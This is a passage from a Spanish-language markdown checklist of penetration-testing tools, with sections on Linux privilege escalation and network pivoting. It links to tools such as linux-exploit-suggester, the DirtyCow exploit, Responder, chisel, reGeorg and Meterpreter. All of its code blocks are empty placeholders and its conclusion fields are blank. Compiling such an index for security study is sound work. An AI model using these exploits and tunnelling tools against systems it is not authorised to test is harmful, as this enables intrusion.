    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINUXPRIVCHECKER👈 --------------------------------->[https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINUX EXPLOIT SUGGESTER👈 --------------------------------->[https://github.com/The-Z-Labs/linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CHKROOTKIT👈 --------------------------------->[https://github.com/Magentron/chkrootkit](https://github.com/Magentron/chkrootkit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LYNIS👈 --------------------------------->[https://github.com/CISOfy/lynis](https://github.com/CISOfy/lynis)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] UNIX-PRIVESC-CHECK👈 --------------------------------->[https://github.com/pentestmonkey/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] DIRDTYCOW👈 --------------------------------->[https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PRIV-ESCALATION metodos👈 --------------------------------->[https://github.com/KevinLiebergen/priv-escalation](https://github.com/KevinLiebergen/priv-escalation)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FILESEC GTFO win y linux👈 --------------------------------->[https://filesec.io/](https://filesec.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RESPONDER👈 --------------------------------->[https://www.kali.org/tools/responder/ ](https://www.kali.org/tools/responder/)-->[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️

<details>

<summary>♻️ PIVOTING ❌</summary>

**PIVOTING**

*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PROXYCHAINS👈 --------------------------------->[https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NCAT👈 --------------------------------->[https://nmap.org/ncat/](https://nmap.org/ncat/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CHISEL👈 --------------------------------->[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/chisel-creacion-de-tunel-entre-servidores-local-y-remoto-tambien-para-aprovechar-pivoting.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CORKSCREW👈 --------------------------------->[https://github.com/bryanpkc/corkscrew](https://github.com/bryanpkc/corkscrew)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METERPRETER👈 --------------------------------->[https://www.metasploit.com/](https://www.metasploit.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] REGEORG👈 --------------------------------->[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RPIVOT👈 --------------------------------->[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀
